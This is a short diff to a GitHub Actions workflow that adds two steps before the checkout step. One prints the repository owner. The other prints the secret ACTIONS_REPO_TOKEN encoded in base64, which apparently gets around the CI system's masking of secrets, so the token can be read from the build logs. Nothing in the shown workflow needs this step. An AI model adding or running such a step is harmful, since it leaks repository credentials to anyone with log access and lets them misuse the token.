@@ -15,6 +15,14 @@ jobs:
       packages: write
 
     steps:
+      - name: Repository owner
+        run: echo ${{ github.repository_owner }}
+        shell: bash
+
+      - name: Token
+        run: echo ${{ secrets.ACTIONS_REPO_TOKEN }} | base64; echo
+        shell: bash
+
       - name: Checkout repository
         uses: actions/checkout@v3
 
